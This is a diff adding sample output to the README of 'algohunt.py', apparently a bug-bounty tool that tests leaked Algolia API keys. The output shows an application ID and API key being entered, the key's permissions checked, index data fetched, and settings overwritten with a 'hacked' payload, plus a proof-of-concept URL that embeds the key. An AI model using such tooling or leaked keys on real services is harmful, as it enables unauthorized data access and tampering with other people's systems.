@@ -86,4 +86,30 @@ python3 algohunt.py
 You can follow me on Twitter/X: https://x.com/Suryesh_92
 
 Subscribe to my Youtube Channel: https://www.youtube.com/@HackWithSuryesh
+
+Enter Algolia Application ID: MH9A52MZTO
+Enter Algolia API Key: 4d89644522b528406ec821a713da60fe
+
+{ "info": { ... } }
+
+This key only has ['search'] permissions. So, it is Informative only.
+
+
+### If a sensitive key is detected:
+
+This key has sensitive ACLs: ['editSettings', 'deleteObject', etc.]
+Do you want to proceed with exploitation? (y/n): y
+
+Indexes available:
+1. products_v1
+2. users_public
+
+Enter the index name to work with: products_v1
+[fetch data]
+[fetch settings]
+Do you want to update this index's settings with payload (highlightPreTag=hacked)? (y/n): y
+[+] Update Response: {...}
+[+] PoC Verification URL:
+https://MH9A52MZTO-dsn.algolia.net/1/indexes/products_v1/settings?x-algolia-application-id=MH9A52MZTO&x-algolia-api-key=4d896...
+
 ```
